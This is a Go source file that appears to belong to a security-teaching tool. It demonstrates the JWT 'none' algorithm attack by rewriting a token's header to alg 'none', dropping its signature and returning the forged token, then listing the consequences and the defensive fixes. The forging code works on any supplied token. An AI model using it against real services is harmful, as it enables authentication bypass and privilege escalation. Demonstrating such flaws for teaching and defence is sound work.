package attacks

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
)

// JWTNoneProcessor implements the JWT None Algorithm attack simulation
type JWTNoneProcessor struct {
	*BaseProcessor
	config *AttackConfig
}

// NewJWTNoneProcessor creates a new JWT None Algorithm attack processor
func NewJWTNoneProcessor() *JWTNoneProcessor {
	return &JWTNoneProcessor{
		BaseProcessor: NewBaseProcessor(),
		config:        NewAttackConfig(),
	}
}

// Configure configures the JWT None processor
func (p *JWTNoneProcessor) Configure(config map[string]interface{}) error {
	// JWT None attack doesn't require specific configuration
	return nil
}

// Process demonstrates the JWT None Algorithm attack
func (p *JWTNoneProcessor) Process(text string, operation string) (string, []string, error) {
	p.addIntroduction()

	// Parse the input as a JWT token or create a sample one
	var originalToken, maliciousToken string
	var err error

	if text == "" {
		// Empty input - create a sample JWT token for demonstration
		originalToken, err = p.createSampleToken()
		if err != nil {
			return "", nil, fmt.Errorf("failed to create sample token: %w", err)
		}
		maliciousToken, err = p.performNoneAttack(originalToken)
	} else if strings.Contains(text, ".") && len(strings.Split(text, ".")) == 3 {
		// Input looks like a JWT token - validate it
		parts := strings.Split(text, ".")
		if len(parts[0]) == 0 || len(parts[1]) == 0 {
			return "", nil, fmt.Errorf("invalid JWT format: empty header or payload")
		}
		originalToken = text
		maliciousToken, err = p.performNoneAttack(originalToken)
	} else {
		// Invalid input format
		return "", nil, fmt.Errorf("invalid input: expected JWT token or empty string")
	}

	if err != nil {
		return "", nil, fmt.Errorf("failed to perform none attack: %w", err)
	}

	// Analyze the attack
	p.analyzeAttack(originalToken, maliciousToken)

	// Add security implications
	p.addSecurityImplications()

	return maliciousToken, p.GetSteps(), nil
}

func (p *JWTNoneProcessor) addIntroduction() {
	p.AddStep("🔓 JWT None Algorithm Attack Demonstration")
	p.AddStep("=====================================")
	p.AddNote("The 'none' algorithm in JWT allows tokens without signature verification")
	p.AddNote("Attackers can modify the algorithm header to bypass signature checks")
	p.AddNote("This attack exploits improper JWT library implementations")
	p.AddSeparator()
}

func (p *JWTNoneProcessor) createSampleToken() (string, error) {
	// Create a sample JWT token with HS256 algorithm
	header := map[string]interface{}{
		"alg": "HS256",
		"typ": "JWT",
	}
	payload := map[string]interface{}{
		"sub":  "1234567890",
		"name": "John Doe",
		"role": "user",
		"iat":  1516239022,
		"exp":  1516242622,
	}

	// Encode header and payload
	headerJSON, err := json.Marshal(header)
	if err != nil {
		return "", err
	}
	payloadJSON, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}

	headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)
	payloadB64 := base64.RawURLEncoding.EncodeToString(payloadJSON)

	// Create a fake signature (this would normally be HMAC-SHA256)
	fakeSignature := "fake_signature_for_demonstration"
	signatureB64 := base64.RawURLEncoding.EncodeToString([]byte(fakeSignature))

	token := fmt.Sprintf("%s.%s.%s", headerB64, payloadB64, signatureB64)

	p.AddStep("Sample JWT Token Created:")
	p.AddStep(fmt.Sprintf("Token: %s", token))
	p.AddSeparator()

	return token, nil
}

func (p *JWTNoneProcessor) performNoneAttack(originalToken string) (string, error) {
	// Split the original token
	parts := strings.Split(originalToken, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("invalid JWT token format")
	}

	// Decode the original header
	headerJSON, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", fmt.Errorf("failed to decode header: %w", err)
	}

	var header map[string]interface{}
	if err := json.Unmarshal(headerJSON, &header); err != nil {
		return "", fmt.Errorf("failed to parse header: %w", err)
	}

	p.AddStep("Original Token Analysis:")
	p.AddStep(fmt.Sprintf("Algorithm: %v", header["alg"]))
	p.AddStep(fmt.Sprintf("Type: %v", header["typ"]))
	p.AddStep(fmt.Sprintf("Header: %s", parts[0]))
	p.AddStep(fmt.Sprintf("Payload: %s", parts[1]))
	p.AddStep(fmt.Sprintf("Signature: %s", parts[2]))
	p.AddSeparator()

	// Create malicious header with "none" algorithm
	maliciousHeader := map[string]interface{}{
		"alg": "none",
		"typ": "JWT",
	}

	// Encode the malicious header
	maliciousHeaderJSON, err := json.Marshal(maliciousHeader)
	if err != nil {
		return "", fmt.Errorf("failed to marshal malicious header: %w", err)
	}

	maliciousHeaderB64 := base64.RawURLEncoding.EncodeToString(maliciousHeaderJSON)

	p.AddStep("Attack Process:")
	p.AddStep("1. Extract the original payload (claims)")
	p.AddStep("2. Create a new header with algorithm set to 'none'")
	p.AddStep("3. Remove the signature (set to empty string)")
	p.AddStep("4. Combine header.payload. (empty signature)")
	p.AddSeparator()

	// Create the malicious token: header.payload. (empty signature)
	maliciousToken := fmt.Sprintf("%s.%s.", maliciousHeaderB64, parts[1])

	p.AddStep("Malicious Token Created:")
	p.AddStep(fmt.Sprintf("New Algorithm: %s", maliciousHeader["alg"]))
	p.AddStep(fmt.Sprintf("New Header: %s", maliciousHeaderB64))
	p.AddStep(fmt.Sprintf("Payload: %s (unchanged)", parts[1]))
	p.AddStep("Signature: (empty)")
	p.AddStep(fmt.Sprintf("Malicious Token: %s", maliciousToken))
	p.AddSeparator()

	return maliciousToken, nil
}

func (p *JWTNoneProcessor) analyzeAttack(originalToken, maliciousToken string) {
	// Decode and analyze both tokens
	originalParts := strings.Split(originalToken, ".")
	maliciousParts := strings.Split(maliciousToken, ".")

	// Decode original header
	originalHeaderJSON, _ := base64.RawURLEncoding.DecodeString(originalParts[0])
	var originalHeader map[string]interface{}
	err := json.Unmarshal(originalHeaderJSON, &originalHeader)
	if err != nil {
		return
	}

	// Decode malicious header
	maliciousHeaderJSON, _ := base64.RawURLEncoding.DecodeString(maliciousParts[0])
	var maliciousHeader map[string]interface{}
	err = json.Unmarshal(maliciousHeaderJSON, &maliciousHeader)
	if err != nil {
		return
	}

	// Decode payloads
	originalPayloadJSON, _ := base64.RawURLEncoding.DecodeString(originalParts[1])
	maliciousPayloadJSON, _ := base64.RawURLEncoding.DecodeString(maliciousParts[1])

	var originalPayload, maliciousPayload map[string]interface{}
	err = json.Unmarshal(originalPayloadJSON, &originalPayload)
	if err != nil {
		return
	}
	err = json.Unmarshal(maliciousPayloadJSON, &maliciousPayload)
	if err != nil {
		return
	}

	p.AddStep("Attack Analysis:")
	p.AddStep("Original Token:")
	p.AddStep(fmt.Sprintf("  Algorithm: %v", originalHeader["alg"]))
	p.AddStep(fmt.Sprintf("  Has Signature: %t", len(originalParts[2]) > 0))
	p.AddStep(fmt.Sprintf("  Signature Length: %d bytes", len(originalParts[2])))

	p.AddStep("Malicious Token:")
	p.AddStep(fmt.Sprintf("  Algorithm: %v", maliciousHeader["alg"]))
	p.AddStep(fmt.Sprintf("  Has Signature: %t", len(maliciousParts[2]) > 0))
	p.AddStep(fmt.Sprintf("  Signature Length: %d bytes", len(maliciousParts[2])))

	p.AddStep("Payload Comparison:")
	p.AddStep("  Original and malicious payloads are identical")
	p.AddStep("  Claims remain unchanged:")
	for key, value := range originalPayload {
		p.AddStep(fmt.Sprintf("    %s: %v", key, value))
	}
	p.AddSeparator()

	// Show what happens during verification
	p.AddStep("Verification Process:")
	p.AddStep("1. JWT library reads the 'alg' field from header")
	p.AddStep("2. If 'alg' is 'none', library skips signature verification")
	p.AddStep("3. Token is considered valid without any cryptographic checks")
	p.AddStep("4. Attacker can modify any claims in the payload")
	p.AddSeparator()
}

func (p *JWTNoneProcessor) addSecurityImplications() {
	p.AddStep("⚠️ Security Implications:")
	p.AddStep("1. Complete bypass of signature verification")
	p.AddStep("2. Attacker can modify any claims in the token")
	p.AddStep("3. Role escalation attacks (change 'role' from 'user' to 'admin')")
	p.AddStep("4. Token forgery without knowing the secret key")
	p.AddStep("5. Session hijacking and privilege escalation")

	p.AddStep("✅ Best Practices:")
	p.AddStep("1. Always verify JWT signatures on the server side")
	p.AddStep("2. Explicitly whitelist allowed algorithms")
	p.AddStep("3. Never trust the 'alg' field from the token")
	p.AddStep("4. Use strong, unique secret keys")
	p.AddStep("5. Implement proper JWT library validation")
	p.AddStep("6. Consider using asymmetric algorithms (RS256, EdDSA)")
	p.AddStep("7. Set short expiration times for tokens")
	p.AddStep("8. Implement token blacklisting for compromised tokens")

	p.AddStep("🔧 Implementation Fixes:")
	p.AddStep("1. Configure JWT library to only accept specific algorithms")
	p.AddStep("2. Validate algorithm before processing token")
	p.AddStep("3. Use secure JWT libraries with proper defaults")
	p.AddStep("4. Implement additional token validation checks")
	p.AddStep("5. Monitor for suspicious token patterns")
}
